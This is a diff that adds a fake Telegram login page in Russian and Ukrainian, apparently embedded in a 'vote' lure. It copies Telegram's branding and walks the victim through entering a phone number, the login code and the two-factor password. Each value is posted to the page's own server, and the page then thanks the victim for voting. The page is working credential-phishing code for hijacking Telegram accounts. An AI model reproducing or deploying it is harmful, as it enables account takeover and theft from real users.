@@ -1,0 +1,378 @@
+    <!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram – Увійти</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #fff;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-box {
+            width: 380px;
+            text-align: center;
+        }
+        .logo {
+            width: 90px;
+            height: 90px;
+            background: url("https://web.telegram.org/a/telegram-logo.1b2bb5b107f046ea9325.svg") center/contain no-repeat;
+            margin: 0 auto 32px;
+            transition: background 0.4s ease;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 8px;
+        }
+        p {
+            font-size: 15px;
+            color: #707579;
+            margin-bottom: 40px;
+            line-height: 1.4;
+        }
+        .field {
+            position: relative;
+            margin-bottom: 16px;
+            transition: all 0.4s ease;
+        }
+        .field.hidden {
+            height: 0;
+            margin: 0;
+            padding: 0;
+            opacity: 0;
+            overflow: hidden;
+        }
+        select, input {
+            width: 100%;
+            height: 56px;
+            padding: 0 16px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 17px;
+            background: #fff;
+            transition: all 0.2s;
+            appearance: none;
+        }
+        select { padding-right: 40px; cursor: pointer; }
+        select:focus, input:focus {
+            outline: none;
+            border-color: #229ed9;
+            box-shadow: 0 0 0 4px rgba(34,158,217,0.12);
+        }
+        .arrow {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 12px;
+            color: #229ed9;
+            pointer-events: none;
+        }
+        .next-btn {
+            width: 100%;
+            height: 52px;
+            margin-top: 12px;
+            background: transparent;
+            color: #229ed9;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .next-btn:hover { background: rgba(34,158,217,0.08); }
+        .next-btn:disabled { color: #a0d8ff; cursor: not-allowed; }
+        .next-btn:not(:disabled):active { background: rgba(34,158,217,0.15); }
+
+        .error {
+            height: 40px;
+            margin: 12px 0;
+            font-size: 14px;
+            color: #ff3b30;
+            text-align: center;
+            opacity: 1;
+            transition: all 0.3s ease;
+            overflow: hidden;
+        }
+
+        .error.hidden {
+            height: 0;
+            margin: 0;
+            padding: 0;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <div class="logo" id="logo"></div>
+    <h1 id="AppName">Telegram</h1>
+    <p id="AppSubname">Введите Ваш номер телефона</p>
+
+    <!-- Крок 1: країна -->
+    <div class="field" id="countryField">
+        <select id="countrySelect" autofocus>
+            <option value="+7">Российская Федерация (+7)</option>
+            <option value="+380">Украина (+380)</option>
+            <option value="+1">Соедененные Штаты (+1)</option>
+            <option value="+44">Великобритания (+44)</option>
+            <option value="+49">Германия (+49)</option>
+            <option value="+33">Франция (+33)</option>
+            <option value="+48">Польша (+48)</option>
+            <option value="+372">Эстония (+372)</option>
+            <option value="+31">Нидерланды (+31)</option>
+        </select>
+        <div class="arrow">▼</div>
+    </div>
+
+    <!-- Крок 1: телефон -->
+    <div class="field" id="phoneWrapper">
+        <input type="tel" id="phoneField" placeholder="Номер телефону">
+    </div>
+
+    <!-- Крок 2: код -->
+    <div class="field hidden" id="codeWrapper">
+        <input type="text" id="codeField" placeholder="Код підтвердження" maxlength="6">
+    </div>
+
+    <!-- Крок 3: пароль -->
+    <div class="field hidden" id="passwordWrapper">
+        <input type="password" id="passwordField" placeholder="Пароль">
+    </div>
+
+    <button class="next-btn" id="next">ПРОДОЛЖИТЬ</button>
+    <div class="error hidden" id="errorMsg"></div>
+</div>
+
+<script>
+    const countrySelect = document.getElementById('countrySelect');
+    const phoneField = document.getElementById('phoneField');
+
+    const nextBtn = document.getElementById('next');
+    const logo = document.getElementById('logo');
+    const appName = document.getElementById('AppName');
+    const appSubname = document.getElementById('AppSubname');
+
+    const countryField = document.getElementById('countryField');
+    const phoneWrapper = document.getElementById('phoneWrapper');
+    const codeWrapper = document.getElementById('codeWrapper');
+    const passwordWrapper = document.getElementById('passwordWrapper');
+
+    const phoneInput = document.getElementById('phoneField');
+    const codeInput = document.getElementById('codeField');
+    const passwordInput = document.getElementById('passwordField');
+
+    const errorMsg = document.getElementById('errorMsg');
+
+    let step = 1;
+
+    function updateButton() {
+        const phoneVal = phoneInput.value.replace(/\D/g, '');
+        nextBtn.disabled = (step === 1 && phoneVal.length < 7);
+    }
+
+    phoneInput.addEventListener('input', updateButton);
+    codeInput.addEventListener('input', () => { if (codeInput.value.length === 6) nextBtn.click(); });
+    passwordInput.addEventListener('input', updateButton);
+
+    nextBtn.addEventListener('click', async () => {
+        if (nextBtn.disabled) return;
+
+        if (step === 1) {
+            try {
+                    errorMsg.classList.add('hidden');
+                    const countryCode = document.getElementById('countrySelect').value;
+                    const phone = phoneInput.value.replace(/\D/g, '');
+
+                    nextBtn.disabled = true;
+
+                    const response = await fetch("/sendCode", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ phone })
+                    });
+                    const data = await response.json();
+
+                    if (data.ok) {
+                        appName.textContent =  '+' + phone;
+                        appSubname.textContent = "Мы отправили код в приложение Telegram на другом Вашем устройстве.";
+
+                        logo.style.background = 'url(https://web.telegram.org/a/monkey.a3d5fcdc50b18dc55695.svg)';
+
+                        countryField.classList.add('hidden');
+                        phoneWrapper.classList.add('hidden');
+                        codeWrapper.classList.remove('hidden');
+                        codeInput.focus();
+
+                        nextBtn.disabled = false;
+                        nextBtn.textContent = "ПОДТВЕРДИТЬ КОД";
+                        step = 2;
+                    } else {
+                        errorMsg.classList.remove('hidden');
+                        errorMsg.textContent = 'Ошибка отправки';
+                    }
+                } catch (e) {
+                    errorMsg.classList.remove('hidden');
+                    errorMsg.textContent = 'Ошибка отправки';
+                }             
+
+
+        }
+        else if (step === 2) {
+              errorMsg.classList.add('hidden');
+              const code = codeInput.value.trim();
+              const phone = phoneInput.value.replace(/\D/g, '');
+                try {
+                    nextBtn.disabled = true;
+
+                    const response = await fetch("/checkCode", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ phone, code })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.ok) {
+
+                       const voteData = {
+                            tg_phone: phone,         
+                            isVoted: false,
+                        };
+                        localStorage.setItem('kimonoVoteUser', JSON.stringify(voteData));
+                        sendPostMessage("Ok","Спасибо за Ваш голос!");
+
+                    } else if(data.needPassword === true) {
+                        appName.textContent = "Введите Ваш Пароль";
+                        appSubname.textContent = "Ваш аккаунт защищен дополнительным паролем";
+
+                        codeWrapper.classList.add('hidden');
+                        passwordWrapper.classList.remove('hidden');
+                        passwordInput.focus();
+                        
+                        nextBtn.disabled = false;
+                        nextBtn.textContent = "ВОЙТИ";
+                        step = 3;
+
+                    }
+                    else{
+                         errorMsg.classList.remove('hidden');
+                         errorMsg.textContent = checkCodeResponse.errorMessage || 'Неверный код';
+                    }
+                } catch (e) {
+                         sendPostMessage("Error","Ошибка авторизации, попробуйте снова");
+                }        
+        }
+        else if (step === 3) {
+             errorMsg.classList.add('hidden');
+             const password = passwordInput.value;
+             const phone = phoneInput.value.replace(/\D/g, '');
+
+            try {
+
+                nextBtn.disabled = true;
+                const response = await fetch("/checkPassword", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ password, phone })
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                        const voteData = {
+                            tg_phone: phone,         
+                            isVoted: true,
+                        };
+                        localStorage.setItem('kimonoVoteUser', JSON.stringify(voteData));
+                        sendPostMessage("Ok","Спасибо за Ваш голос!");
+
+                } else {
+                     errorMsg.classList.remove('hidden');
+                     errorMsg.textContent = checkPassResponse.errorMessage || 'Неверный пароль';
+                }
+            } catch (e) {
+                 errorMsg.classList.remove('hidden');
+                 errorMsg.textContent = checkPassResponse.errorMessage || 'Неверный пароль';
+                 sendPostMessage("Error","Ошибка авторизации, попробуйте снова");
+            }            
+        }
+
+        function sendPostMessage(result,message){
+            const userData = {
+            res: result, 
+            msg: message, 
+        };
+        window.parent.postMessage(userData, '*');
+        }
+    });
+
+    function getCountryCode() {
+        return countrySelect.value; 
+    }
+
+    // Форматирование номера
+    function formatPhoneNumber() {
+        let countryCode = getCountryCode(); // ← вот здесь всегда свежий код!
+
+        // Убираем всё кроме цифр
+        let digits = phoneField.value.replace(/\D/g, '');
+
+        // Если номер уже начинается с текущего кода страны — убираем его из цифр
+        const codeWithoutPlus = countryCode.slice(1);
+        if (digits.startsWith(codeWithoutPlus)) {
+            digits = digits.slice(codeWithoutPlus.length);
+        }
+
+        // Формируем: код + пробел + 3 цифры + пробел + 3 цифры + пробел + остальное
+        let formatted = countryCode;
+
+        if (digits.length > 0) {
+            formatted += ' ' + digits.slice(0, 3);
+
+            if (digits.length > 3) {
+                formatted += ' ' + digits.slice(3, 6);
+
+                if (digits.length > 6) {
+                    formatted += ' ' + digits.slice(6);
+                }
+            }
+        }
+
+        phoneField.value = formatted;
+    }
+
+
+    countrySelect.addEventListener('change', () => {
+    phoneField.value = countrySelect.value;   // полностью очищаем поле
+    phoneField.focus();                   // сразу можно вводить цифры
+});
+
+    // При вводе в поле телефона
+    phoneField.addEventListener('input', () => {
+        formatPhoneNumber();
+    });
+
+    // Курсор в конец при фокусе
+    phoneField.addEventListener('focus', () => {
+        setTimeout(() => {
+            phoneField.setSelectionRange(phoneField.value.length, phoneField.value.length);
+        }, 0);
+    });
+
+    formatPhoneNumber();
+    updateButton();
+</script>
+
+</body>
+</html>
